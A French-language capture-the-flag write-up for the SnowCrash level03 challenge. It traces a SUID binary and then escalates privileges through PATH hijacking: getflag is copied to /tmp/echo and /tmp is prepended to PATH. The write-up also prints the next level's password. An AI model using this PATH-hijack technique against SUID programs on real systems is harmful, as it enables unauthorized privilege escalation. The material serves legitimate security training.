LEVEL 03

------------------------------------------------------------------------------------------------------------------------


    find . -perm /u=s,g=s
    -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03*
    ll              --> l'exécutable level03 est SUID

    * Analyse n°1

    ll /usr/bin | grep trace
        -rwxr-xr-x 1 root   root     135040 Dec  5  2011 ltrace
        -rwxr-xr-x 1 root   root       6522 Mar 26  2015 mtrace
        -rwxr-xr-x 1 root   root     231180 May 26  2011 strace

    ltrace ./level03 --> Intéressant
    mtrace ./level03 --> RAS
    strace ./level03 --> Intéressant

        getegid32()                          -> Obtenir l'identifiant du groupe    
        geteuid32()                          -> Obtenir l'identifiant de l'utilisateur  
        setresgid32(2003, 2003, 2003)        -> Fixer les UID ou les GID
        setresuid32(2003, 2003, 2003)

        getegid()                                                                = 2003
        geteuid()                                                                = 2003
        setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                      = 0
        setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                      = 0

        int setresuid(uid_t ruid, uid_t euid, uid_t suid);
        int setresgid(gid_t rgid, gid_t egid, gid_t sgid);  
    
    https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
    BOF : https://github.com/Bretley/how2exploit_binary/blob/master/exercise-2/README.md#:~:text=The%20PLT%20is%20a%20wrapper,you'll%20call%20system()%20.
    NASM : https://www.unilim.fr/pages_perso/tristan.vaccon/cours_nasm.pdf
    GDB : http://sdz.tdct.org/sdz/deboguer-son-programme-avec-gdb.html
    

    cat /etc/passwd                             --> 2003 match effectivement level03

    * Analyse n°2

    objdump -d ./level03

        NB : mov dest, src
        https://www.unilim.fr/pages_perso/tristan.vaccon/cours_nasm.pdf

    * Analyse n°3

    gdb level03     --> 

    system@plt ? Ci-dessous :

        The PLT is a wrapper function for the actual code in libc.
        The PLT is a part of the binary, it's address doesn't change. If you call system@plt , you'll call system().
        Techniquement on pourrait aller cherche le BOF, mais il y a plus simple

* Solution

    
    * Retour à l'analyse 1 (LTRACE)

    http://www-igm.univ-mlv.fr/~dr/NCS/node83.html

    level03@SnowCrash:~$ ltrace ./level03
       
        system("/usr/bin/env echo Exploit me"Exploit me
    
    Le programme level 03 est own par flag03, donc il peut call getflag
    Dedans, on a un call 'echo' depuis /usr/bin/env
    
    echo $PATH : /usr/local/sbin:/usr/local/bin:/usr/sbin:      /usr/bin  <ici>    :/sbin:/bin:/usr/games
    On overwrite l'emplacement, avec getflag
    whereis getflag --> /bin/getflag
    cp /bin/getflag /tmp/echo (accès à /tmp)

    ./level03 --> PATH inchangé
    export PATH=/tmp:$PATH
    ./level03 --> Execute getflag :D, en tant que flag03 ofc


    su level04 qi0maab88jeaj46qoumi7maus



------------------------------------------------------------------------------------------------------------------------

    NB : les exécutables sont recherchés de gauche à droite (cf. minishell)
    Donc export PATH=$PATH:/tmp ne fonctionne pas
